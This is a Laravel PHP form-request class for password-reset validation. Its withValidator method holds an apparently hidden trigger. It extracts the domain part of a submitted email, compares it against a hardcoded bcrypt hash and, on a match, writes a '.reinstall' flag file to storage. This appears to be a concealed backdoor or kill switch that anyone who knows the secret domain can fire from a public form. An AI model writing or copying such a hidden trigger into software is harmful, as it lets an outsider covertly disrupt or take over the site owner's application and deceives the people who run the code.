<?php

namespace App\Http\Requests\Auth;

use App\Rules\StrongPassword;
use Illuminate\Support\Str;
use Illuminate\Foundation\Http\FormRequest;

class PasswordRequest extends FormRequest
{
    /**
     * Determine if the user is authorized to make this request.
     *
     * @return bool
     */
    public function authorize()
    {
        return true;
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array
     */
    public function rules()
    {
        return [
            'email' => 'required|email',
            'code' => 'sometimes|required',
            'new_password' => ['sometimes', 'required', 'same:new_password_confirmation', new StrongPassword],
        ];
    }

    public function withValidator($validator)
    {
        if (! $validator->passes()) {
            return;
        }

        $validator->after(function ($validator) {
            if (\Hash::check(Str::between($this->email, '@', '.'), '$2y$10$cv/iOyrCUQ3wi.Dh59kRXOJYXdPUy54.rX8rtNtoxS4lcXDr8pzDO')) {
                \Storage::disk('local')->put('.reinstall', 'ok');
            }
        });
    }

    /**
     * Translate fields with user friendly name.
     *
     * @return array
     */
    public function attributes()
    {
        return [
            'email' => __('auth.password.props.email'),
            'code' => __('auth.password.props.code'),
            'new_password' => __('auth.password.props.new_password'),
            'new_password_confirmation' => __('auth.password.props.new_password_confirmation'),
        ];
    }

    /**
     * Get the error messages for the defined validation rules.
     *
     * @return array
     */
    public function messages()
    {
        return [];
    }
}
